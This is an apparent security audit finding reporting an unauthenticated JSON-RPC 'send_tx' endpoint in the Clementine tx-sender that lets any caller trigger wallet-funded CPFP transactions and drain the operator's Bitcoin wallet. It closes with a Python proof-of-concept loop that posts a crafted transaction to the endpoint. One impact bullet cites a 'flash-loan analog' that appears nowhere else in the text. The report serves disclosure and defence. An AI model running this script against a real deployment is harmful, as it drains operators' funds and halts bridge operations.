### Title
Unauthenticated tx-sender JSON-RPC `send_tx` endpoint allows any caller to enqueue CPFP transactions and drain the operator's Bitcoin wallet — (`crates/clementine-tx-sender/src/jsonrpc/server.rs`)

### Summary

The standalone tx-sender service exposes a JSON-RPC server (`send_tx` / `send_citrea_tx`) with **zero authentication**. Any caller who can reach the bind address can submit arbitrary transactions with attacker-chosen `fee_paying_type`, `cancel_outpoints`, `cancel_txids`, and `activate_outpoints`. When `fee_paying_type: CPFP` is submitted and no confirmed fee-payer UTXOs exist for the new `try_to_send_id`, the tx-sender calls `create_fee_payer_utxo`, which calls `fund_raw_transaction` + `sign_raw_transaction_with_wallet` on the operator's Bitcoin Core wallet and broadcasts the result. An attacker can repeat this indefinitely, draining the operator's wallet and preventing the tx-sender from funding legitimate bridge transactions (kickoff, payout, reimbursement).

### Finding Description

**Root cause — no authentication on the JSON-RPC server**

`start_jsonrpc_server` builds the server with `ServerBuilder::default()` and no middleware:

```rust
let server: Server = ServerBuilder::default()
    .max_request_body_size(MAX_JSONRPC_REQUEST_BODY_SIZE)
    .build(bind_addr)
    .await
    .map_err(|e| BridgeError::Eyre(e.into()))?;
``` [1](#0-0) 

The registered `send_tx` handler accepts any `InsertTryToSendParams` — including attacker-chosen `fee_paying_type`, `cancel_outpoints`, `cancel_txids`, `activate_txids`, and `activate_outpoints` — and inserts it directly into the tx-sender queue:

```rust
module.register_async_method("send_tx", |params, client, _| async move {
    let req: InsertTryToSendParams = params.one().map_err(jsonrpc_err)?;
    let raw_tx = hex::decode(&req.signed_tx_hex).map_err(jsonrpc_err)?;
    let signed_tx: Transaction = consensus::deserialize(&raw_tx).map_err(jsonrpc_err)?;
    ...
    let try_to_send_id = client.insert_try_to_send(
        &mut dbtx, req.tx_metadata, &signed_tx,
        req.fee_paying_type, req.rbf_signing_info,
        &req.cancel_outpoints, &req.cancel_txids,
        &req.activate_txids, &req.activate_outpoints,
    ).await.map_err(jsonrpc_err)?;
``` [2](#0-1) 

There is no API key, no TLS, no IP allowlist, and no rate limit on this server. The gRPC servers use mTLS + the `OnlyAggregatorAndSelf` interceptor, but the JSON-RPC server has none of that. [3](#0-2) 

**CPFP wallet-drain path**

When the tx-sender loop processes a queued CPFP entry and finds no confirmed fee-payer UTXOs for that `try_to_send_id`, it calls `create_fee_payer_utxo`. That function:

1. Constructs a transaction with an output to `self.signer.address()`.
2. Calls `fund_raw_transaction` on the Bitcoin Core RPC — this adds inputs **from the operator's Bitcoin wallet**.
3. Calls `sign_raw_transaction_with_wallet` and broadcasts the result. [4](#0-3) 

Each new `try_to_send_id` (one per `send_tx` call) triggers a fresh `create_fee_payer_utxo` invocation. Because `insert_try_to_send` does not deduplicate by txid, the attacker can submit the same crafted transaction repeatedly, each time generating a new `try_to_send_id` and a new wallet-funded fee-payer UTXO. [5](#0-4) 

**Bind-address exposure**

The config explicitly allows `0.0.0.0` as a bind address:

```rust
pub struct TxSenderJsonRpcConfig {
    /// Bind address for the JSON-RPC server. Restricted to 127.0.0.1 or 0.0.0.0.
    pub bind: String,
``` [6](#0-5) 

The standalone run script enables the `json-rpc` feature and defaults to `127.0.0.1`, but `0.0.0.0` is a documented and supported option. Even `127.0.0.1` is reachable by any co-located process or container on the same host. [7](#0-6) 

### Impact Explanation

- **tx-sender-managed balance drain**: Each unauthenticated `send_tx` call with `fee_paying_type: CPFP` causes `fund_raw_transaction` to spend from the operator's Bitcoin Core wallet. Repeated calls drain the wallet.
- **Bridge liveness failure**: The operator's wallet funds legitimate bridge transactions (kickoff, payout, reimbursement). Once drained, the tx-sender cannot create fee-payer UTXOs for those transactions, stalling the entire bridge lifecycle and locking deposited BTC.
- **No cryptographic barrier**: Unlike the flash-loan analog (which required the attacker to make the lending pool call the callback), here there is no check at all — the attacker calls the endpoint directly.

### Likelihood Explanation

- The `json-rpc` feature is explicitly compiled and started in the standalone tx-sender deployment (`cargo run -p clementine-tx-sender --features json-rpc`).
- The server requires no credentials. Any process reachable to the bind address can exploit it.
- The attack requires only HTTP POST requests with a crafted JSON body — no privileged keys, no on-chain setup beyond a small UTXO to craft a syntactically valid transaction.
- Duplicate submissions are accepted (confirmed by `test_try_to_send_duplicate`), so the attacker can loop indefinitely.

### Recommendation

1. **Add authentication to the JSON-RPC server.** At minimum, require a shared secret (bearer token or HMAC) in the HTTP `Authorization` header, validated in a tower middleware layer before the handler is reached.
2. **Restrict the bind address to `127.0.0.1` unconditionally** in production, or enforce this in the config parser rather than relying on documentation.
3. **Add rate limiting** to the JSON-RPC server (analogous to the `RateLimitLayer` used on the gRPC servers).
4. **Validate `fee_paying_type`** against a per-caller allowlist, or remove `CPFP` as an option from the external JSON-RPC interface entirely (internal callers already use `TxSenderClient` directly).

### Proof of Concept

```python
import json, requests

# Craft a minimal syntactically-valid Bitcoin transaction with a P2A anchor output.
# P2A script: OP_1 OP_PUSHBYTES_2 0x4e73
P2A_TX_HEX = (
    "02000000"          # version
    "00"                # no inputs (invalid on-chain, but passes consensus::deserialize)
    "01"                # 1 output
    "e803000000000000"  # 1000 sat
    "0451024e73"        # P2A scriptpubkey (len=4, OP_1 OP_PUSHBYTES_2 4e73)
    "00000000"          # locktime
)

payload = {
    "jsonrpc": "2.0", "id": 1, "method": "send_tx",
    "params": [{
        "tx_metadata": None,
        "signed_tx_hex": P2A_TX_HEX,
        "fee_paying_type": "cpfp",   # triggers create_fee_payer_utxo
        "rbf_signing_info": None,
        "cancel_outpoints": [],
        "cancel_txids": [],
        "activate_txids": [],
        "activate_outpoints": [],
    }]
}

# Repeat N times — each call creates a new try_to_send_id and a new
# fund_raw_transaction call against the operator's Bitcoin wallet.
for _ in range(100):
    r = requests.post("http://<tx-sender-host>:3030",
                      json=payload,
                      headers={"content-type": "application/json"})
    print(r.json())
```

Each iteration causes the tx-sender loop to call `create_fee_payer_utxo` → `fund_raw_transaction` → `sign_raw_transaction_with_wallet` → broadcast, spending from the operator's Bitcoin wallet until it is exhausted.
